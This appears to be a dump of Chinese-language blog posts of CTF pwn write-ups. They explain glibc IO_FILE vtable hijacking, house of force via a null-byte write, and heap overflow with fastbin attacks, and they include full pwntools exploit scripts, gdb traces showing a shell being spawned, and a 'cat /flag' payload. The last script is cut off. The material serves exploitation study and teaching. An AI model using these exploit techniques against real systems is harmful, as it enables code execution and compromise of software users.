&quot;\\360\\364\\af\\374U&quot;, _IO_write_end = 0x7f6d94f61b98 &lt;main_arena+120&gt; &quot;\\210\\033\\366\\224m\\177&quot;, _IO_buf_base = 0x7f6d94f61b98 &lt;main_arena+120&gt; &quot;\\210\\033\\366\\224m\\177&quot;, _IO_buf_end = 0x7f6d94f61ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\366\\224m\\177&quot;, _IO_save_base = 0x7f6d94f61ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\366\\224m\\177&quot;, _IO_backup_base = 0x7f6d94f61bb8 &lt;main_arena+152&gt; &quot;\\250\\033\\366\\224m\\177&quot;, _IO_save_end = 0x7f6d94f61bb8 &lt;main_arena+152&gt; &quot;\\250\\033\\366\\224m\\177&quot;, _markers = 0x55fc6607f4f0, _chain = 0x55fc6607f4f0, _fileno = 0x94f61bd8, _flags2 = 0x7f6d, _old_offset = 0x7f6d94f61bd8, _cur_column = 0x1be8, _vtable_offset = 0xf6, _shortbuf = &quot;\\224&quot;, _lock = 0x7f6d94f61be8 &lt;main_arena+200&gt;, _offset = 0x7f6d94f61bf8, _codecvt = 0x7f6d94f61bf8 &lt;main_arena+216&gt;, _wide_data = 0x7f6d94f61c08 &lt;main_arena+232&gt;, _freeres_list = 0x7f6d94f61c08 &lt;main_arena+232&gt;, _freeres_buf = 0x7f6d94f61c18 &lt;main_arena+248&gt;, __pad5 = 0x7f6d94f61c18, _mode = 0x94f61c28, _unused2 = &quot;m\\177\\000\\000(\\034\\366\\224m\\177\\000\\000\\070\\034\\366&quot;... &#125;, vtable = 0x7f6d94f61c38 &lt;main_arena+280&gt;&#125; 之后通过_chain获取下一个_IO_FILE_plus 1234567891011795 /* Something was added to the list. Start all over again. */ 796 fp = (_IO_FILE *) _IO_list_all; 797 last_stamp = _IO_list_all_stamp; 798 &#125; 799 else ► 800 fp = fp-&gt;_chain; 801 &#125; 802 803 #ifdef _IO_MTSAFE_IO 804 if (do_lock) 805 _IO_lock_unlock (list_all_lock); 满足条件就进入了if，执行_IO_OVERFLOW 1234567891011781 || (_IO_vtable_offset (fp) == 0 782 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr 783 &gt; fp-&gt;_wide_data-&gt;_IO_write_base)) 784 #endif 785 )► 786 &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 787 result = EOF; 788 789 if (do_lock) 790 _IO_funlockfile (fp); 791 run_fp = NULL; 最终执行的是我们的system，rdi也就是fp，就是/bin/sh,getshell没问题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────── RAX 0x55fc6607f5d0 ◂— 0x0 RBX 0x55fc6607f4f0 ◂— 0x68732f6e69622f /* &apos;/bin/sh&apos; */ RCX 0x7f6d94bd2730 (sigprocmask+16) ◂— cmp rax, -0x1000 /* &apos;H=&apos; */ RDX 0x0 RDI 0x55fc6607f4f0 ◂— 0x68732f6e69622f /* &apos;/bin/sh&apos; */ RSI 0xffffffff R8 0x4 R9 0x0 R10 0x8 R11 0x246 R12 0x7f6d95172700 ◂— 0x7f6d95172700 R13 0x0 R14 0x0 R15 0x0 RBP 0x0 RSP 0x7ffcd401da30 ◂— 0x3a30302030303030 (&apos;0000 00:&apos;) RIP 0x7f6d94c19193 (_IO_flush_all_lockp+371) ◂— call qword ptr [rax + 0x18]─────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────── 0x7f6d94c19284 &lt;_IO_flush_all_lockp+612&gt; cmp qword ptr [rbx + 0x28], rax 0x7f6d94c19288 &lt;_IO_flush_all_lockp+616&gt; ja _IO_flush_all_lockp+356 &lt;0x7f6d94c19184&gt; ↓ 0x7f6d94c19184 &lt;_IO_flush_all_lockp+356&gt; mov rax, qword ptr [rbx + 0xd8] 0x7f6d94c1918b &lt;_IO_flush_all_lockp+363&gt; mov esi, 0xffffffff 0x7f6d94c19190 &lt;_IO_flush_all_lockp+368&gt; mov rdi, rbx ► 0x7f6d94c19193 &lt;_IO_flush_all_lockp+371&gt; call qword ptr [rax + 0x18] &lt;0x7f6d94be2390&gt; 0x7f6d94c19196 &lt;_IO_flush_all_lockp+374&gt; cmp eax, -1 0x7f6d94c19199 &lt;_IO_flush_all_lockp+377&gt; mov eax, 0xffffffff 0x7f6d94c1919e &lt;_IO_flush_all_lockp+382&gt; cmove ebp, eax 0x7f6d94c191a1 &lt;_IO_flush_all_lockp+385&gt; test r14d, r14d 0x7f6d94c191a4 &lt;_IO_flush_all_lockp+388&gt; je _IO_flush_all_lockp+464 &lt;0x7f6d94c191f0&gt;──────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────In file: /home/giantbranch/glibc-2.23/libio/genops.c 781 || (_IO_vtable_offset (fp) == 0 782 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr 783 &gt; fp-&gt;_wide_data-&gt;_IO_write_base)) 784 #endif 785 ) ► 786 &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 787 result = EOF; 788 789 if (do_lock) 790 _IO_funlockfile (fp); 791 run_fp = NULL;──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffcd401da30 ◂— 0x3a30302030303030 (&apos;0000 00:&apos;)01:0008│ 0x7ffcd401da38 ◂— 0x66370a2030203030 (&apos;00 0 \\n7f&apos;)02:0010│ 0x7ffcd401da40 ◂— 0x3063383135396436 (&apos;6d9518c0&apos;)03:0018│ 0x7ffcd401da48 ◂— 0x39643666372d3030 (&apos;00-7f6d9&apos;)04:0020│ 0x7ffcd401da50 ◂— &apos;518d000 &#125;&apos;05:0028│ 0x7ffcd401da58 ◂— 0x7d /* &apos;&#125;&apos; */06:0030│ 0x7ffcd401da60 —▸ 0x7ffcd401de20 ◂— 0x20 /* &apos; &apos; */07:0038│ 0x7ffcd401da68 ◂— 0x7d /* &apos;&#125;&apos; */────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────── ► f 0 7f6d94c19193 _IO_flush_all_lockp+371 f 1 7f6d94bd3fbd abort+253 f 2 7f6d94c147ea f 3 7f6d94c1f13e _int_malloc+1470 f 4 7f6d94c1f13e _int_malloc+1470 f 5 7f6d94c21184 malloc+84 f 6 55fc6549cd6d f 7 55fc6549d402 f 8 7f6d94bbd830 __libc_start_main+240gdb-peda$ x 0x7f6d94be23900x7f6d94be2390 &lt;__libc_system&gt;: 0xfa86e90b74ff8548 那个rax就是jump table了 123456789101112131415161718192021222324gdb-peda$ p *(struct _IO_jump_t *)$rax$28 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = 0x7f6d94be2390 &lt;__libc_system&gt;, __underflow = 0x0, __uflow = 0x0, __pbackfail = 0x0, __xsputn = 0x0, __xsgetn = 0x0, __seekoff = 0x0, __seekpos = 0x0, __setbuf = 0x0, __sync = 0x0, __doallocate = 0x0, __read = 0x0, __write = 0x0, __seek = 0x0, __close = 0x0, __stat = 0x0, __showmanyc = 0x0, __imbue = 0x0&#125; referencehttp://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.htmlhttps://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"IO_FILE 利用的基础知识","slug":"IO_FILE 利用的基础知识","date":"2018-12-14T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/12/14/IO_FILE 利用的基础知识/","link":"","permalink":"https://www.giantbranch.cn/2018/12/14/IO_FILE 利用的基础知识/","excerpt":"","text":"源码跟踪通过grep可以查看一些到对应的代码在哪 12345678910111213141516171819giantbranch@ubuntu:~$ grep &quot;struct _IO_FILE &quot; -r ./glibc-2.23/./glibc-2.23/libio/libioP.h:typedef struct _IO_FILE *_IO_ITER;./glibc-2.23/libio/libio.h: struct _IO_FILE *_sbuf;./glibc-2.23/libio/libio.h:struct _IO_FILE &#123;./glibc-2.23/libio/libio.h: struct _IO_FILE *_chain;./glibc-2.23/libio/libio.h: struct _IO_FILE _file;./glibc-2.23/libio/libio.h: struct _IO_FILE *_freeres_list;./glibc-2.23/libio/libio.h:typedef struct _IO_FILE _IO_FILE;./glibc-2.23/libio/stdio.h:typedef struct _IO_FILE FILE;./glibc-2.23/libio/stdio.h:typedef struct _IO_FILE __FILE;./glibc-2.23/libio/stdio.h:extern struct _IO_FILE *stdin; /* Standard input stream. */./glibc-2.23/libio/stdio.h:extern struct _IO_FILE *stdout; /* Standard output stream. */./glibc-2.23/libio/stdio.h:extern struct _IO_FILE *stderr; /* Standard error output stream. */./glibc-2.23/libio/strfile.h: struct _IO_FILE _f;./glibc-2.23/libio/genops.c: struct _IO_FILE **f;./glibc-2.23/libio/genops.c: struct _IO_FILE *fp;./glibc-2.23/libio/genops.c: struct _IO_FILE *fp;./glibc-2.23/libio/genops.c: struct _IO_FILE *fp;./glibc-2.23/ChangeLog.17: * libio/stdio.h: Define struct _IO_FILE in global namespace. 至于源码可以通过命令下载 1apt-get source libc6-dev 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 其中多个_IO_FILE以struct _IO_FILE *_chain;相连组成链表，头指针是_IO_list_all 可以看到链表的指向是_IO_list_all到2 1 0 12345678gdb-peda$ p _IO_list_all$24 = (struct _IO_FILE_plus *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;gdb-peda$ p ((struct _IO_FILE *)0x7ffff7dd2540)._chain$29 = (struct _IO_FILE *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;gdb-peda$ p ((struct _IO_FILE *)0x7ffff7dd2620)._chain$30 = (struct _IO_FILE *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;gdb-peda$ p ((struct _IO_FILE *)0x7ffff7dd18e0)._chain$31 = (struct _IO_FILE *) 0x0 更进一步，有一个_IO_FILE_plus，其实他就多一个jump table 12345struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;; 因为这个file就是_IO_FILE 123struct _IO_FILE;/* The opaque type of streams. This is the definition used elsewhere. */typedef struct _IO_FILE FILE; 这个table就是函数指针 12345678910111213141516171819202122232425struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);&#125;; 那么我们就有可能通过vtable劫持控制流 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。 例子https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/io-file/2018_hctf_the_end/the_end 只有5个写一字节的机会，那我们只能通过exit劫持控制流 1234567891011121314151617void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; signed int i; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] sleep(0); printf(&quot;here is a gift %p, good luck ;)\\n&quot;, &amp;sleep); fflush(_bss_start); close(1); close(2); for ( i = 0; i &lt;= 4; ++i ) &#123; read(0, &amp;buf, 8uLL); read(0, buf, 1uLL); &#125; exit(1337);&#125; exit会调用_IO_unbuffer_all，里面会调用setbuf我们可以对setbuf下断点，即_IO_new_file_setbuf 当然里面也会调用_IO_flush_all_lockp，你去覆盖overflow也是可以的 不行的话对所有jumptable的函数都下个断点，那就知道会调用哪个了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859gdb-peda$ p _IO_2_1_stdout_ $41 = &#123; file = &#123; _flags = 0xfbad2a84, _IO_read_ptr = 0x555555756010 &quot;here is a gift &quot;..., _IO_read_end = 0x555555756010 &quot;here is a gift &quot;..., _IO_read_base = 0x555555756010 &quot;here is a gift &quot;..., _IO_write_base = 0x555555756010 &quot;here is a gift &quot;..., _IO_write_ptr = 0x555555756010 &quot;here is a gift &quot;..., _IO_write_end = 0x555555756010 &quot;here is a gift &quot;..., _IO_buf_base = 0x555555756010 &quot;here is a gift &quot;..., _IO_buf_end = 0x555555756410 &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;gdb-peda$ p *(struct _IO_jump_t *)0x7ffff7dd06e0$45 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a869c0 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a87730 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a874a0 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a88600 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a89980 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a861e0 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a85ec0 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a854c0 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a88a00 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a85430 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a85370 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a7a180 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a861a0 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a85b70 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a85970 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a85340 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a85b60 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a89af0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a89b00 &lt;_IO_default_imbue&gt;&#125; 下断点后，断下来，可以看到exit调用了它 123456789gdb-peda$ bt#0 _IO_new_file_setbuf (fp=0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;, p=0x0, len=0x0) at fileops.c:450#1 0x00007ffff7a8939f in _IO_unbuffer_all () at genops.c:915#2 _IO_cleanup () at genops.c:960#3 0x00007ffff7a46f9b in __run_exit_handlers (status=0x539, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=0x1) at exit.c:95#4 0x00007ffff7a47045 in __GI_exit (status=&lt;optimized out&gt;) at exit.c:104#5 0x0000555555554969 in ?? ()#6 0x00007ffff7a2d830 in __libc_start_main (main=0x5555555548d0, argc=0x1, argv=0x7fffffffe558, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe548) at ../csu/libc-start.c:291#7 0x00005555555547c9 in ?? () 那个伪造的vtable地址+0x58的位置必须跟one_gadget的高5位都是一致的 由于本地的libc没有一个onegadget满足条件，所以没成功，但是是成功起shell了 123456gdb-peda$ cContinuing.process 49883 is executing new program: /bin/dashWarning:Cannot insert breakpoint 5.Cannot access memory at address 0x7fae55ca7216 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-14 18:25:22# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./the_end&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)vtable_point_offset = 3954424# onegadget_offset = 0xf02a4onegadget_offset = 0x45216fake_vtable_offset = 3953800fake_vtable_setbuf_offset = fake_vtable_offset + 0x58def getpid(): print proc.pidof(p)[0] pause()p.recvuntil(&quot;here is a gift &quot;)sleep_addr = int(p.recvuntil(&quot;, good luck&quot;)[:-11], 16)print &quot;sleep_addr = &quot; + hex(sleep_addr)libc_base = sleep_addr - libc.symbols[&quot;sleep&quot;]print &quot;libc_base = &quot; + hex(libc_base)vtable_point = libc_base + vtable_point_offsetprint &quot;vtable_point = &quot; + hex(vtable_point)onegadget = libc_base + onegadget_offset print &quot;onegadget = &quot; + hex(onegadget)fake_vtable = libc_base + fake_vtable_offset print &quot;fake_vtable = &quot; + hex(fake_vtable)fake_vtable_setbuf = libc_base + fake_vtable_setbuf_offset print &quot;fake_vtable_setbuf = &quot; + hex(fake_vtable_setbuf)for x in xrange(0,2): p.send(p64(vtable_point + x)) p.send(p64(fake_vtable)[x])getpid()for x in xrange(0,3): p.send(p64(fake_vtable_setbuf + x)) p.send(p64(onegadget)[x])p.sendline(&quot;cat /flag &gt;&amp;0&quot;)p.interactive() referencehttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"io_file","slug":"io-file","permalink":"https://www.giantbranch.cn/tags/io-file/"}]},{"title":"CTF PWN之任意地址写NULL到house of force——myhouse","slug":"CTF PWN之任意地址写NULL到house of force——myhouse","date":"2018-12-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/12/13/CTF PWN之任意地址写NULL到house of force——myhouse/","link":"","permalink":"https://www.giantbranch.cn/2018/12/13/CTF PWN之任意地址写NULL到house of force——myhouse/","excerpt":"","text":"题目：https://github.com/giantbranch/CTF_PWN/tree/master/2018/tie3/myhouse 保护措施，got表可写，没开PIE 123456gdb-peda$ checksec CANARY : ENABLEDFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : Partial 一开始看到add_house有个size-1，这不是堆溢出吗，结果应该是由于size过大，read不了，只能找其他出路 1read(0, housed, size - 1); 不断尝试，发现下面的v3是可以跟size是不一致的，第一次可以大于0x30000，控制v3，那么就可以任意地址写NULL 123456789101112131415161718192021222324252627282930313233343536unsigned __int64 add_house()&#123; int v0; // eax size_t size; // [rsp+0h] [rbp-30h] __int64 v3; // [rsp+8h] [rbp-28h] char s; // [rsp+10h] [rbp-20h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, 0x10uLL); myputs(&quot;What&apos;s your name?&quot;); read(0, &amp;owner, 0x20uLL); myputs(&quot;What is the name of your house?&quot;); housen = malloc(0x100uLL); read(0, housen, 0x100uLL); myputs(&quot;What is the size of your house?&quot;); read(0, &amp;s, 0xFuLL); v0 = atoi(&amp;s); v3 = v0; size = v0; if ( (unsigned __int64)v0 &gt; 0x300000 ) &#123; do &#123; myputs(&quot;Too large!&quot;); read(0, &amp;s, 0xFuLL); size = atoi(&amp;s); &#125; while ( size &gt; 0x300000 ); &#125; housed = malloc(size); myputs(&quot;Give me its description:&quot;); read(0, housed, size - 1); *((_BYTE *)housed + v3 - 1) = 0; return __readfsqword(0x28u) ^ v5;&#125; 难点在于add_house的漏洞利用只能利用一次 总体思路：1、通过申请大于等于0x200000的内存，那边会用mmap分配，而这个mmap分配的内存跟libc的偏移是固定的2、我们通过精准控制v3，将null写到top chunk指针的最低位，top chunk指针就指向了house name的最后的16字节的位置（堆地址可以通过owner泄露）3、当然在这之前得控制house name的最后一个8字节为8个\\xff,这是为house of force做的铺垫4、然后我们就可以利用house of force，申请特定的大小让malloc返回值到house_description_addr5、将house_description覆盖为got就可以泄露libc6、而同时覆盖room，那就可以覆盖atoi的got来getshell了 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-11 21:43:54# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./myhouse&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def init(mmap_topchunkpoint_offset): p.recvuntil(&quot;What&apos;s your name?\\n&quot;) p.send(&quot;1&quot; * 0x20) p.recvuntil(&quot;What is the name of your house?\\n&quot;) p.send(&quot;\\x00&quot; * (0x100 - 8) + &quot;\\xff&quot; * 8) p.recvuntil(&quot;What is the size of your house?\\n&quot;) p.sendline(str(mmap_topchunkpoint_offset)) p.recvuntil(&quot;Too large!\\n&quot;) # use mmap and use null byte write bug to write top chunk point p.sendline(str(0x200000)) p.recvuntil(&quot;Give me its description:\\n&quot;) p.send(&quot;not use&quot;) def build_room(size): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;What is the size of your room?\\n&quot;) p.sendline(str(size))def decorate_room(content): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Make your room more shining!\\n&quot;) p.sendline(content)def show_house(): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;3&quot;)def getpid(): print proc.pidof(p)[0] pause()mmap_topchunkpoint_offset = 6052713atoi_got = 0x602058write_got = 0x602018set_buf_plt = 0x400710# .bss:00000000006020C0 housedhouse_description_addr = 0x00000000006020C0housen_addr = 0x602100mmap_system_distance = 2384768# use null byte overwrite top chunk point to house of forceinit(mmap_topchunkpoint_offset)# leak heap addrshow_house()p.recvuntil(&quot;1&quot; * 0x20)heap_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;heap_addr = &quot; + hex(heap_addr)fake_topchunk_addr = heap_addr + 240print &quot;fake_topchunk_addr = &quot; + hex(fake_topchunk_addr)# fake_topchunk_addr + malloc_size = house_description_addr - 0x10malloc_size = house_description_addr - 0x20 - fake_topchunk_addr # 劫持到house_description, 写got表，泄露libcbuild_room(malloc_size)build_room(0x100)decorate_room(p64(write_got) + p64(atoi_got))show_house()p.recvuntil(&quot;And description:\\n&quot;)write_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;write_addr = &quot; + hex(write_addr)# 计算system和/bin/sh的地址print &quot;\\ncalculating system() addr ... ###&quot;system_addr = write_addr + (libc.symbols[&apos;system&apos;] - libc.symbols[&apos;write&apos;])print &quot;system_addr = &quot; + hex(system_addr)# system_addr = mmap_addr + mmap_system_distance# print &quot;system_addr = &quot; + hex(system_addr)# 覆盖room，写got表decorate_room(p64(system_addr))p.recvuntil(&quot;Your choice:\\n&quot;)p.sendline(&quot;/bin/sh\\x00&quot;)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"CTF PWN之堆漏洞转化为栈漏洞利用——bookstore","slug":"CTF PWN之堆漏洞转化为栈漏洞利用——bookstore","date":"2018-12-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/12/11/CTF PWN之堆漏洞转化为栈漏洞利用——bookstore/","link":"","permalink":"https://www.giantbranch.cn/2018/12/11/CTF PWN之堆漏洞转化为栈漏洞利用——bookstore/","excerpt":"","text":"题目：https://github.com/giantbranch/CTF_PWN/tree/master/2018/tie3/bookstore 保护措施，NX还有got表不可写 123456gdb-peda$ checksec CANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : FULL 一开始连漏洞的发现不了，后来同事说了才发现readn一开始将size减一了，那我们输入0，那就可以堆溢出了 12345678910111213141516171819202122__int64 __fastcall readn(__int64 a1, int a2)&#123; __int64 result; // rax unsigned int v3; // eax unsigned __int8 buf; // [rsp+1Bh] [rbp-5h] unsigned int v5; // [rsp+1Ch] [rbp-4h] v5 = 0; while ( 1 ) &#123; result = (unsigned int)(a2 - 1); if ( (unsigned int)result &lt;= v5 ) break; read(0, &amp;buf, 1uLL); result = buf; if ( buf == 10 ) break; v3 = v5++; *(_BYTE *)(a1 + v3) = buf; &#125; return result;&#125; 整体思路如下：1、通过堆溢出构造一个small bin大小的size，free之后就可以泄露libc了2、通过fastbin attack，控制malloc的返回值到bss段的books，覆盖book name指针，泄露environ里面存的值，即泄露了栈地址3、最后在add book的时候发现一个0x40的fake fastbin size，所以后面直接利用fastbin attack将malloc的返回值控制到栈上，覆盖返回地址即可，一开始试了所有one_gadget都不行，最后直接pop rdi ret；system直接起shell 成功结果： exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-08 19:39:57# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *# context.log_level = &quot;debug&quot;p = process(&quot;./bookstore&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)environ_offset = libc.symbols[&apos;environ&apos;]book_addr = 0x602060# local libc# environ_offset = 0x3c6f38main_arena_offset = 0x3c4b20# one_gadget_offset = 0xf02a4one_gadget_offset = 0xf1147# 0x0000000000400cd3 : pop rdi ; retpop_rdi_ret = 0x0000000000400cd3def add_book(author, size, bookname): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;What is the author name?\\n&quot;) p.sendline(author) p.recvuntil(&quot;How long is the book name?\\n&quot;) p.sendline(str(size)) p.recvuntil(&quot;What is the name of the book?\\n&quot;) p.sendline(bookname)def sellbook(index, ): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Which book do you want to sell?\\n&quot;) p.sendline(str(index))def readbook(index): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Which book do you want to sell?\\n&quot;) p.sendline(str(index))def getpid(): print proc.pidof(p)[0] pause()add_book(p64(0) + p64(0x21) , 0, &quot;a&quot; * 8)add_book(&quot;B&quot;, 0, &quot;b&quot; * 8)add_book(&quot;C&quot;, 0, &quot;c&quot; * 8)add_book(&quot;D&quot;, 0x50, &quot;d&quot; * 8)add_book(&quot;e&quot;, 0x50, p64(0) + p64(0x51))# overflow B to C and leak libcsellbook(1)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x91))sellbook(2)add_book(&quot;b&quot;, 0, &quot;a&quot; * 8)readbook(2)p.recvuntil(&quot;a&quot; * 8)main_arena_near = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;main_arena_near = &quot; + hex(main_arena_near)main_arena_addr = main_arena_near - 0xd8print &quot;main_arena_addr = 